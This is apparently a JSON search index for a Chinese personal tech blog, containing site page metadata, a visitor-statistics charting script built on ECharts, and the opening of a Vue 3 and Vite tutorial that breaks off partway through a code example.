{"meta":{"title":"Ada","subtitle":"Adaの博客","description":"性能测试 | 自动化测试 | web安全测试","author":"Ada","url":"https://www.adaLucky.com","root":"/"},"pages":[{"title":"404","date":"2019-08-10T08:41:10.000Z","updated":"2022-06-13T14:43:37.098Z","comments":true,"path":"404.html","permalink":"https://www.adalucky.com/404.html","excerpt":"","text":""},{"title":"","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"README.html","permalink":"https://www.adalucky.com/README.html","excerpt":"","text":"www.adaLucky.com我的笔记博客"},{"title":"放松一下","date":"2019-08-10T08:41:10.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/index.html","permalink":"https://www.adalucky.com/List/index.html","excerpt":"","text":"影音资源共享"},{"title":"about","date":"2019-10-24T16:00:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"about/index.html","permalink":"https://www.adalucky.com/about/index.html","excerpt":"","text":""},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"archives/index.html","permalink":"https://www.adalucky.com/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-10-24T16:00:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"categories/index.html","permalink":"https://www.adalucky.com/categories/index.html","excerpt":"","text":""},{"title":"census","date":"2020-10-31T02:11:28.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"census/index.html","permalink":"https://www.adalucky.com/census/index.html","excerpt":"","text":""},{"title":"留言板","date":"2019-10-24T16:00:00.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"contact/index.html","permalink":"https://www.adalucky.com/contact/index.html","excerpt":"","text":"畅所欲言 在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！ 友链 Adaの友链信息 博客名称: Adaの博客 博客网址: https://adalucky.github.io 博客介绍: The harder you work, the luckier you will be"},{"title":"友链","date":"2019-07-19T08:42:10.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"friends/index.html","permalink":"https://www.adalucky.com/friends/index.html","excerpt":"","text":""},{"title":"资源分享","date":"2019-07-19T08:40:27.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"resource/index.html","permalink":"https://www.adalucky.com/resource/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-07-19T08:40:27.000Z","updated":"2022-06-13T14:43:37.110Z","comments":true,"path":"tags/index.html","permalink":"https://www.adalucky.com/tags/index.html","excerpt":"","text":""},{"title":"相册","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/index.html","permalink":"https://www.adalucky.com/List/galleries/index.html","excerpt":"","text":""},{"title":"视频","date":"2019-08-10T08:41:10.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/movies/index.html","permalink":"https://www.adalucky.com/List/movies/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/music/index.html","permalink":"https://www.adalucky.com/List/music/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/tools/index.html","permalink":"https://www.adalucky.com/List/tools/index.html","excerpt":"","text":""},{"title":"journal","date":"2021-08-31T17:34:28.000Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"about/journal/index.html","permalink":"https://www.adalucky.com/about/journal/index.html","excerpt":"","text":""},{"title":"乖巧小狗","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/乖巧小狗/index.html","permalink":"https://www.adalucky.com/List/galleries/%E4%B9%96%E5%B7%A7%E5%B0%8F%E7%8B%97/index.html","excerpt":"","text":""},{"title":"二次元风","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/二次元风/index.html","permalink":"https://www.adalucky.com/List/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/index.html","excerpt":"","text":""},{"title":"动漫人物","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/动漫人物/index.html","permalink":"https://www.adalucky.com/List/galleries/%E5%8A%A8%E6%BC%AB%E4%BA%BA%E7%89%A9/index.html","excerpt":"","text":""},{"title":"动漫插画","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/动漫插画/index.html","permalink":"https://www.adalucky.com/List/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/index.html","excerpt":"","text":""},{"title":"动漫风景","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/动漫风景/index.html","permalink":"https://www.adalucky.com/List/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"呆萌猫咪","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/呆萌猫咪/index.html","permalink":"https://www.adalucky.com/List/galleries/%E5%91%86%E8%90%8C%E7%8C%AB%E5%92%AA/index.html","excerpt":"","text":""},{"title":"城市风光","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/城市风光/index.html","permalink":"https://www.adalucky.com/List/galleries/%E5%9F%8E%E5%B8%82%E9%A3%8E%E5%85%89/index.html","excerpt":"","text":""},{"title":"清新花卉","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/清新花卉/index.html","permalink":"https://www.adalucky.com/List/galleries/%E6%B8%85%E6%96%B0%E8%8A%B1%E5%8D%89/index.html","excerpt":"","text":""},{"title":"炫酷跑车","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/炫酷跑车/index.html","permalink":"https://www.adalucky.com/List/galleries/%E7%82%AB%E9%85%B7%E8%B7%91%E8%BD%A6/index.html","excerpt":"","text":""},{"title":"璀璨星空","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/璀璨星空/index.html","permalink":"https://www.adalucky.com/List/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/index.html","excerpt":"","text":""},{"title":"甜美食品","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/甜美食品/index.html","permalink":"https://www.adalucky.com/List/galleries/%E7%94%9C%E7%BE%8E%E9%A3%9F%E5%93%81/index.html","excerpt":"","text":""},{"title":"自然风景","date":"2022-06-13T14:43:37.102Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"List/galleries/自然风景/index.html","permalink":"https://www.adalucky.com/List/galleries/%E8%87%AA%E7%84%B6%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"","date":"2022-06-13T14:43:37.106Z","updated":"2022-06-13T14:43:37.106Z","comments":true,"path":"census/census.bak.js","permalink":"https://www.adalucky.com/census/census.bak.js","excerpt":"","text":"var metrics = 'pv_count' // 统计访问次数 PV 填写 'pv_count'，统计访客数 UV 填写 'visitor_count'，二选一 var metricsName = (metrics === 'pv_count' ? '访问次数' : (metrics === 'visitor_count' ? '访客数' : '')) function generatePieces(maxValue, colorBox) { var pieces = []; var quotient = 1; var temp = {'lt': 1, 'label': '0', 'color': colorBox[0]}; pieces.push(temp); if (maxValue &amp;&amp; maxValue &gt;= 10) { quotient = Math.floor(maxValue / 10)+1; for (var i = 1; i &lt;= 10; i++) { var temp = {}; if (i == 1) temp.gte = 1; else temp.gte = quotient * (i - 1); temp.lte = quotient * i; temp.color = colorBox[i]; pieces.push(temp); } } return JSON.stringify(pieces); } var append_div_visitcalendar = (parent, text) =&gt; { if (parent !== null) { if (typeof text === 'string') { var temp = document.createElement('div'); temp.innerHTML = text; var frag = document.createDocumentFragment(); while (temp.firstChild) { frag.appendChild(temp.firstChild) } parent.appendChild(frag) } else { parent.appendChild(text) } } }; function calChart () { let script = document.createElement(\"script\") fetch('/census/data/ipcalendar.json?date'+new Date()).then(data =&gt; data.json()).then(data =&gt; { let date_arr = data.result.items[0]; let value_arr = data.result.items[1]; let calArr = []; let maxValue = 0, total = 0, weekdatacore = 0, thisweekdatacore = 0; let colorBox = ['#EBEDF0', '#90EE90', '#98FB98', '#32CD32', '#00FF00', '#7FFF00', '#3CB371', '#2E8B57', '#228B22', '#008000', ' #006400']; for (let i = 0; i &lt; date_arr.length; i++) { calArr.push([date_arr[i][0], value_arr[i][0] === '--' ? 0 : value_arr[i][0]] ); maxValue = value_arr[i][0] &gt; maxValue ? value_arr[i][0] : maxValue ; total += value_arr[i][0] === '--' ? 0 : value_arr[i][0]; } for (let i = date_arr.length-1; i &gt;= date_arr.length-7; i--) weekdatacore += value_arr[i][0] === '--' ? 0 : value_arr[i][0]; for (let i = date_arr.length-1; i &gt;= date_arr.length-30; i--) thisweekdatacore += value_arr[i][0] === '--' ? 0 : value_arr[i][0]; let calArrJson = JSON.stringify(calArr); script.innerHTML = ` var calChart = echarts.init(document.getElementById(\"calendar_container\")); var option = { title: { text: '访问日历' }, tooltip: { padding: 10, backgroundColor: '#555', borderColor: '#777', borderWidth: 1, textStyle: { color: '#fff' }, formatter: function (obj) { var value = obj.value; return '' + value[0] + '：' + value[1] + ''; } }, visualMap: { show: false, showLabel: true, min: 0, max: ${maxValue}, type: 'piecewise', orient: 'horizontal', left: 'center', bottom: 0, pieces: ${generatePieces(maxValue, colorBox)} }, calendar: [{ left: 'center', range: ['${date_arr[0]}', '${date_arr[date_arr.length-1]}'], cellSize: [14, 14], splitLine: { show: false }, itemStyle: { color: '#ebedf0', borderColor: '#fff', borderWidth: 2 }, yearLabel: { show: false }, monthLabel: { nameMap: 'cn', fontSize: 11 }, dayLabel: { formatter: '{start} 1st', nameMap: 'cn', fontSize: 11 } }], series: [{ type: 'heatmap', coordinateSystem: 'calendar', calendarIndex: 0, data: ${calArrJson}, }] }; calChart.setOption(option);`; let style = '.number{font-family: sans-serif, Arial;margin-top: 10px;text-align:center;width:100%;padding:10px;margin:0 auto;}.contrib-column{text-align:center;border-left:1px solid #ddd;border-top:1px solid #ddd;}.contrib-column-first{border-left:0;}.table-column{padding:10px;display:table-cell;flex:1;vertical-align:top;}.contrib-number{font-weight:400;line-height:1.3em;font-size:24px;display:block;}.left.text-muted{float:left;margin-left:9px;color:#767676;}.left.text-muted a{color:#4078c0;text-decoration:none;}.left.text-muted a:hover{text-decoration:underline;}h2.f4.text-normal.mb-3{display:none;}.float-left.text-gray{float:left;}.position-relative{width:100%;}@media screen and (max-width:650px){.contrib-column{display:none}}'; style = '过去一年访问' + total + '' + date_arr[0][0] + '&nbsp;-&nbsp;' + date_arr[date_arr.length-1][0] + '最近30天访问' + thisweekdatacore + '' + date_arr[date_arr.length-30][0] + '&nbsp;-&nbsp;' + date_arr[date_arr.length-1][0] + '最近7天访问' + weekdatacore + '' + date_arr[date_arr.length-7][0] + '&nbsp;-&nbsp;' + date_arr[date_arr.length-1][0] + '' + style; document.getElementById(\"calendar_container\").after(script); append_div_visitcalendar(calendar_container, style); }).catch(function (error) { console.log(error); }); } function get_year(s) { return parseInt(s.substr(0, 4)) } function get_month(s) { return parseInt(s.substr(5, 2)) } // 浏览量 function pvChart () { let script = document.createElement(\"script\") fetch('/census/data/pv.json?date'+new Date()).then(data =&gt; data.json()).then(data =&gt; { let date = new Date(); let monthValueArr = {}; let monthName = data.result.items[0]; let monthValue = data.result.items[1]; for (let i =2020; i &lt;= date.getFullYear(); i++) monthValueArr[String(i)] = [ , , , , , , , , , , , ]; monthValueArr for (let i = 0; i &lt; monthName.length; i++) { let year = get_year(monthName[i][0]); let month = get_month(monthName[i][0]); monthValueArr[String(year)][String(month-1)] = monthValue[i][0]; } script.innerHTML = ` var pvChart = echarts.init(document.getElementById('pv_container'), 'light'); var pvOption = { color: ['#01C2F9', '#18D070', '#d223e7', '#3F77FE'], title: { text: '站点访问量统计', subtext: '数据来源: 百度统计（自 2021/08/26 开始统计）', textStyle: { color: '#504b4d', } }, legend: { data: ['2020年访问量', '2021年访问量'], //修改年份 bottom: 0, left: 'center', textStyle: { color: '#504b4d', } }, tooltip: { trigger: 'axis' }, toolbox: { show: true, feature: { mark: { show: true }, magicType: { show: true, type: ['line', 'bar', 'stack', 'tiled'] }, restore: { show: true }, saveAsImage: { show: true } } }, calculable: true, xAxis: [{ type: 'category', boundaryGap: false, data: ['一月', '二月', '三月', '四月', '五月', '六月', '七月', '八月', '九月', '十月', '十一月', '十二月'], axisLabel: { formatter: '{value}', textStyle: { color: '#929298' } } }], yAxis: [{ type: 'value', axisLabel: { formatter: '{value}', textStyle: { color: '#929298' } }, axisTick: { show: true }, axisLine: { show: true, lineStyle: { color: '#4c4948'} } }], series: [{ name: '2020年访问量', type: 'line', stack: '总量', data: [${monthValueArr[\"2020\"]}], axisLabel: { formatter: '{value}', //第一个年份对应的数据顺序对应月份 textStyle: { color: '#929298' } } }, { name: '2021年访问量', type: 'line', stack: '总量', data: [${monthValueArr[\"2021\"]}], //第二个年份对应的数据顺序对应月份 axisLabel: { formatter: '{value}', textStyle: { color: '#929298' } } }] }; pvChart.setOption(pvOption); window.addEventListener(\"resize\", () =&gt; { pvChart.resize(); });` document.getElementById('pv_container').after(script); }).catch(function (error) { console.log(error); }); } //访客数 function uvChart () { let script = document.createElement(\"script\") fetch('/census/data/uv.json?date'+new Date()).then(data =&gt; data.json()).then(data =&gt; { let date = new Date(); let monthValueArr = {}; let monthName = data.result.items[0]; let monthValue = data.result.items[1]; for (let i =2020; i &lt;= date.getFullYear(); i++) monthValueArr[String(i)] = [ , , , , , , , , , , , ]; monthValueArr for (let i = 0; i &lt; monthName.length; i++) { let year = get_year(monthName[i][0]); let month = get_month(monthName[i][0]); monthValueArr[String(year)][String(month-1)] = monthValue[i][0]; } script.innerHTML = ` var uvChart = echarts.init(document.getElementById('uv_container'), 'light'); var uvOption = { color: ['#d223e7', '#3F77FE', '#01C2F9', '#18D070'], title: { text: '站点访客数统计', subtext: '数据来源: 百度统计（自 2021/08/26 开始统计）', textStyle: { color: '#504b4d', } }, tooltip: { trigger: 'axis' }, legend: { data: ['2020年访客数', '2021年访客数'], bottom: 0, left: 'center', textStyle: { color: '#504b4d', } }, //修改年份 toolbox: { show: true, feature: { mark: { show: true }, magicType: { show: true, type: ['line', 'bar', 'stack', 'tiled'] }, restore: { show: true }, saveAsImage: { show: true } } }, calculable: true, xAxis: [{ type: 'category', boundaryGap: false, data: ['一月', '二月', '三月', '四月', '五月', '六月', '七月', '八月', '九月', '十月', '十一月', '十二月'], axisLabel: { formatter: '{value}', textStyle: { color: '#929298' } } }], yAxis: [{ type: 'value', axisLabel: { formatter: '{value}', textStyle: { color: '#929298' } }, axisTick: { show: true }, axisLine: { show: true, lineStyle: { color: '#4c4948'} } }], series: [{ name: '2020年访客数', type: 'line', smooth: true, itemStyle: { normal: { areaStyle: { type: 'default' } } }, data: [${monthValueArr[\"2020\"]}], //第一个年份对应的数据顺序对应月份 axisLabel: { formatter: '{value}', textStyle: { color: '#929298' } }, }, { name: '2021年访客数', type: 'line', smooth: true, itemStyle: { normal: { areaStyle: { type: 'default' } } }, data: [${monthValueArr[\"2021\"]}], //第二个年份对应的数据顺序对应月份 axisLabel: { formatter: '{value}', textStyle: { color: '#929298' } }, }] }; uvChart.setOption(uvOption); window.addEventListener(\"resize\", () =&gt; { uvChart.resize(); });` document.getElementById('uv_container').after(script); }).catch(function (error) { console.log(error); }); } // 访问地图 function mapChart () { let script = document.createElement(\"script\") fetch('/census/data/map.json?date'+new Date()).then(data =&gt; data.json()).then(data =&gt; { let mapName = data.result.items[0] let mapValue = data.result.items[1] let mapArr = [] let max = mapValue[0][0] for (let i = 0; i &lt; mapName.length; i++) { mapArr.push({ name: mapName[i][0].name, value: mapValue[i][0] }) } let mapArrJson = JSON.stringify(mapArr) script.innerHTML = ` var mapChart = echarts.init(document.getElementById('map_container'), 'light'); var mapOption = { title: { text: '访问地点' }, tooltip: { trigger: 'item' }, visualMap: { min: 0, max: ${max}, left: 'left', top: 'bottom', text: ['高','低'], color: ['#1E90FF', '#AAFAFA'], calculable: true }, series: [{ name: '${metricsName}', type: 'map', mapType: 'china', showLegendSymbol: false, label: { emphasis: { show: false } }, itemStyle: { normal: { areaColor: 'rgba(255, 255, 255, 0.1)', borderColor: '#121212' }, emphasis: { areaColor: 'gold' } }, data: ${mapArrJson} }] }; mapChart.setOption(mapOption); window.addEventListener(\"resize\", () =&gt; { mapChart.resize(); });` document.getElementById('map_container').after(script); }).catch(function (error) { console.log(error); }); } // 访问来源 function sourcesChart () { let script = document.createElement(\"script\"); var innerHTML = ''; var link = 0, direct = 0, search = 0; fetch('/census/data/sources.json?date'+new Date()).then(data =&gt; data.json()).then(data =&gt; { let sourcesName = data.result.items[0]; let sourcesValue = data.result.items[1]; let sourcesArr = []; for (let i = 0; i &lt; sourcesName.length; i++) sourcesArr.push({ name: sourcesName[i][0].name, value: sourcesValue[i][0] }); link = sourcesArr[1]['value'] ; search = sourcesArr[2]['value'] ; direct = sourcesArr[0]['value'] ; innerHTML += ` var sourcesChart = echarts.init(document.getElementById('sources_container'), 'light'); var sourcesOption = { title:{text:'站点访客来源统计',itemGap:20,textStyle:{color:'#504b4d',}}, tooltip: { trigger: 'item', formatter: '{a} {b}: {c} ({d}%)' }, legend: { data: ['直达', '外链', '搜索', '百度', '谷歌', '必应', 'Github', '开往/十年之约'], y: 'bottom' }, series: [ { name: '来源明细', type: 'pie', radius: ['45%', '60%'], labelLine: { length: 30 }, label: { formatter: '{a|{a}}{abg|}\\\\n{hr|}\\\\n {b|{b}：}{c} {per|{d}%} ', backgroundColor: '#F6F8FC', borderColor: '#8C8D8E', borderWidth: 1, borderRadius: 4, rich: { a: { color: '#6E7079', lineHeight: 22, align: 'center' }, hr: { borderColor: '#8C8D8E', width: '100%', borderWidth: 1, height: 0 }, b: { color: '#4C5058', fontSize: 14, fontWeight: 'bold', lineHeight: 33 }, per: { color: '#fff', backgroundColor: '#4C5058', padding: [3, 4], borderRadius: 4 } } }, data: [`; }).catch(function (error) { console.log(error); }); fetch('/census/data/engine.json?date'+new Date()).then(data =&gt; data.json()).then(data =&gt; { let enginesName = data.result.items[0]; let enginesValue = data.result.items[1]; let enginesArr = []; for (let i = 0; i &lt; enginesName.length; i++) enginesArr.push({ name: enginesName[i][0].name, value: enginesValue[i][0] }); innerHTML += ` {value: ${enginesArr[1]['value']}, name: '谷歌'}, {value: ${enginesArr[0]['value']}, name: '百度'},`; }).catch(function (error) { console.log(error); }); fetch('/census/data/link.json?date'+new Date()).then(data =&gt; data.json()).then(data =&gt; { let linksName = data.result.items[0]; let linksValue = data.result.items[1]; let linksArr = {}; for (let i = 0; i &lt; linksName.length; i++) linksArr[linksName[i][0].name] = linksValue[i][0]; let sum = data.result.sum[0][0]; let bing = linksArr['http://cn.bing.com']+linksArr['http://www.bing.com']; let github = linksArr['http://github.com']; innerHTML += ` {value: ${bing}, name: '必应'}, {value: ${direct}, name: '直达'}, {value: ${github}, name: 'Github'}, {value: ${sum-bing-github}, name: '友链'} ] }, { name: '访问来源', type: 'pie', selectedMode: 'single', radius: [0, '30%'], label: { position: 'inner', fontSize: 14}, labelLine: { show: false }, data: [ {value: ${search+bing}, name: '搜索', itemStyle: { color : 'green' }}, {value: ${direct}, name: '直达', itemStyle: { color : '#FFDB5C' }}, {value: ${link-bing}, name: '外链', itemStyle: { color : '#32C5E9' }} ] }, ] }; sourcesChart.setOption(sourcesOption); window.addEventListener(\"resize\", () =&gt; { sourcesChart.resize(); });`; script.innerHTML = innerHTML; }).catch(function (error) { console.log(error); }); document.getElementById('sources_container').after(script); } if (document.getElementById(\"calendar_container\")) calChart(); if (document.getElementById('map_container')) mapChart(); if (document.getElementById('uv_container')) uvChart(); if (document.getElementById('pv_container')) pvChart(); if (document.getElementById('sources_container')) sourcesChart();"}],"posts":[{"title":"VUE3上","slug":"Auto/VUE3上","date":"2022-06-05T12:51:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/vue3-shang/","link":"","permalink":"https://www.adalucky.com/auto/vue3-shang/","excerpt":"Vue (读音 /vjuː/，类似于 view) 是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。","text":"Vue (读音 /vjuː/，类似于 view) 是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。 参考资料 Vite创建项目 Vue3 推荐的脚手架是 vite ，据说编译打包什么的更加快，所以这里我们就用 vite 开始搭建项目，就不用 vue-cli 来搭建了 Vite HMR 速度快到惊人的 [模块热更新（HMR） 采用 Rollup打包 它使用 Rollup 打包你的代码，并且它是预配置的 并且支持大部分rollup插件 安装依赖：yarn （进入项目根目录后执行） 启动项目：可以用截图中的 yarn dev 也可直接用 vite # yarn 创建项目 yarn create vite # npm 创建项目 npm init vite@latest # pnpm 创建项目 pnpm create vite 目录介绍 以下目录一般是标准的操作，建议按照这种规范去实行 public：下面的不会被编译,可以存放图片或者静态资源 src assets：可以被编译的,一般存放静态资源比如图片进行base64 components：公共组件 App.vue：全局的组件，尤其注意里面写的样式会影响到其它的 main.ts：公共的 ts 文件 index.html：非常重要的入口文件 （webpack，rollup 他们的入口文件都是enrty input 是一个js文件 而Vite 的入口文件是一个html文件，他刚开始不会编译这些js文件 只有当你用到的时候 如script src=”xxxxx.js” 会发起一个请求被vite拦截这时候才会解析js文件） package.json：包配置信息 tsconfig.json：ts 的配置 vite.config.ts：vite的配置文件 yarn.lock：依赖的锁定版本 vite 配置 vite 的配置都在 vite.config.js 中 相对路径 打包后再的 html 在 windows 上是正常的，但是在 Mac或者 linux 上可能是访问不到，会有提示Refused to apply style from 'http://localhost:63342/assets/index.16c4fe9c.css' because its MIME type ('text/html') is not a supported stylesheet MIME type, and strict MIME checking is enabled. 原因就是 访问的路径默认是 /assets 下找 css js 资源， 但是在 Mac 或者 Linux 下会认为是最顶层的文件目录，因此找不到需要用 ./assets alias-TODO alias 别名 环境准备 在时间中可能会遇到 切换 node 版本的情况，这里推荐使用 nvm 进行 node.js 版本的管理 这里就不展开了参考博客Nvm Nrm 使用教程 下载插件 volar,在当vue3.2发布完之后 vetur 并不能给我们提供良好的代码提示，所以volar顺应而生 与vetur相同，volar是一个针对vue的vscode插件，不过与vetur不同的是，volar提供了更为强大的功能（使用的时候需要把vetur 设置为禁用状态） 分别安装 Vue Language Features (Volar) TypeScript Vue Plugin(Volar) 认识 VUE简介 Vue (读音 /vjuː/，类似于 view)是一套用于构建用户界面的渐进式框架 Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合 和库不一样，Vue是一套架构，会基于自身特点向用户提供一套相当完整的解决方案，而且控制权在框架本身；对项目的侵入性较大，使用者要按照框架所规定的某种特定规范进行开发，项目如果需要更换框架，则需要重新架构整个项目。 渐进式就跟下面图片一样，开发可以根据需求，逐渐递增所要的方式，但每个方式有不是依靠行特别强 vue两大核心 响应式的数据绑定：当数据发生改变，视图可以自动更新，可以不用关心dom操作，而专心数据操作 可组合的视图组件：把视图按照功能切分成若干基本单元，组件可以一级一级组合整个应用形成倒置组件树，可维护，可重用，可测试 组件：我们一般将需要复用的东西封装成一个组件 一处封装处处调用 Vue2 &amp; Vue3 Vue3 组合式 API（Composition API） 主要用于在大型组件中提高代码逻辑的可复用性。 传统的组件随着业务复杂度越来越高，代码量会不断的加大，整个代码逻辑都不易阅读和理解。 Vue3 使用组合式 API 的地方为 setup。 在 setup 中，我们可以按逻辑关注点对部分代码进行分组，然后提取逻辑片段并与其他组件共享代码。因此，组合式 API（Composition API） 允许我们编写更有条理的代码。 发现传统的 vue2 使用 Option Api 逻辑比较分散 可读性差 可维护性差,对比 vue3 Composition Api 逻辑分明 可维护性 高 Vue3 新特性Composition Api Setup 函数式编程 也叫vue Hook 例如 ref reactive watch computed toRefs toRaws 我们会在下几个章节详解 重写双向绑定 vue2 基于 Object.defineProperty()实现 vue3 基于Proxy proxy与Object.defineProperty(obj, prop, desc)方式相比有以下优势： 丢掉麻烦的备份数据 省去for in 循环 可以监听数组变化 代码更简化 可以监听动态新增的属性； 可以监听删除的属性 ； 可以监听数组的索引和 length 属性； let proxyObj = new Proxy(obj,{ get : function (target,prop) { return prop in target ? target[prop] : 0 }, set : function (target,prop,value) { target[prop] = 888; } }) 优化Vdom 在Vue2中,每次更新diff,都是全量对比,Vue3则只对比带有标记的,这样大大减少了非动态内容的对比消耗 Fragment Vue3 支持多个根节点,Vue2 template 中只能有一个根节点 &lt;template&gt; &lt;div&gt;12&lt;/div&gt; &lt;div&gt;23&lt;/div&gt; &lt;/template&gt; Tree shaking 之前 webpack 里面的树摇,能减少打包后的代码体积 VUE 开发初体验VUE文件介绍SFC 语法规范 *.vue 文件都由三种类型的顶层语法块所组成：&lt;template&gt; &lt;script&gt; &lt;style&gt; template 每个 *.vue 文件最多可同时包含一个顶层 &lt;template&gt; 块。 其中的内容会被提取出来并传递给 @vue/compiler-dom，预编译为 JavaScript 的渲染函数，并附属到导出的组件上作为其 render 选项。 script 每一个 *.vue 文件可同时包含多个 &lt;script&gt; 块 (不包括 &lt;script setup&gt;) 该脚本将作为 ES Module 来执行 其默认导出的内容应该是 Vue 组件选项对象，它要么是一个普通的对象，要么是 defineComponent 的返回值 script setup 每个 *.vue 文件最多可同时包含一个 &lt;script setup&gt; 块 (不包括常规的 &lt;script&gt;) 该脚本会被预处理并作为组件的 setup() 函数使用，也就是说它会在每个组件实例中执行。&lt;script setup&gt; 的顶层绑定会自动暴露给模板。更多详情请查看 &lt;script setup&gt; 文档 style 一个 *.vue 文件可以包含多个 &lt;style&gt; 标签。 &lt;style&gt; 标签可以通过 scoped 或 module attribute (更多详情请查看 SFC 样式特性) 将样式封装在当前组件内。多个不同封装模式的 &lt;style&gt; 标签可以在同一个组件中混 js引入及创建 APP 可以下载 cdn 地址的 js 到本地引用 通过Vue.createApp 创建实例对象 实例中 return返回的数据，可在被挂载的组件中通过 两对大括号的方式 声明式定义 点击显/隐代码块 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;!-- vue@next 这个是最新版，不推荐这么用，一般用指定版本 或者下载 js 文件，防止自动更新后语法出错--&gt; &lt;!-- &lt;script src=\"https://unpkg.com/vue@next\"&gt;&lt;/script&gt;--&gt; &lt;script src=\"../js/vue.global.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;!--这是一个组件--&gt; &lt;div id=\"demo\"&gt; {{messages}}&lt;br&gt; {{msg}} &lt;/div&gt; &lt;script&gt; &lt;!-- 创建一个实例 app --&gt; const app = Vue.createApp({ data() { return { messages: \"this is a test\", msg: \"hello vue\" } } }).mount(\"#demo\") // 挂载上面的 demo 组件 console.log(`原始的 app.msg 信息：${app.msg}`); app.msg = \"hello vue3.2.31\" // 这里能改变 data return 下 msg 值，也就是 return 里面的都是app实例的属性 &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; v-for 取整个返回的数组：v-for=\"titles in articles 从数组中下标 0 开始取 5 条：v-for=\"titles in articles.slice(0, 5) 将每次遍历的结果赋值给 titles 插入属性 对标签中新增属性，可通过冒号+属性名的方式来操作，例如：&lt;div style=\"color: red;background:yellow\" :style=\"{width,height}\"&gt; height,width 是 ES6 json 的简写，既是键又是值 点击控制是否显示 在 &lt;h2&gt; 标签上添加点击，改变show 的布尔值控制 display 属性是否显示 点击显/隐代码块 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script src=\"../js/vue.global.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;style&gt; .box { color: blue; background: green; display: none; /*将元素的显示设为无 隐藏*/ } div.show { display: block; } &lt;/style&gt; &lt;div id=\"demo\"&gt; {{messages}} &lt;h2 @click=\"show = !show\"&gt;{{msg}}&lt;/h2&gt; &lt;!-- &lt;div class=\"box\" :class=\"{show:true}\" :style=\"{width,height}\"&gt;--&gt; &lt;div class=\"box\" :class=\"{show}\" :style=\"{width,height}\"&gt; &lt;ul&gt; &lt;li v-for=\"titles in articles.slice(0, 5)\"&gt;{{titles.title}}&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;script&gt; const app = Vue.createApp({ data() { return { show: true, messages: \"this is a test\", msg: \"hello vue\", height: \"200px\", width: \"300px\", articles: [ {title: 'title111111', content: \"content1111\"}, {title: 'title222222', content: \"content1112\"}, {title: 'title333333', content: \"content1113\"}, {title: 'title444444', content: \"content1114\"}, {title: 'title555555', content: \"content1115\"}, {title: 'title666666', content: \"content1116\"}, {title: 'title777777', content: \"content1117\"}, ] } } }).mount(\"#demo\") // 挂载上面的 demo 组件 console.log(`原始的 app.msg 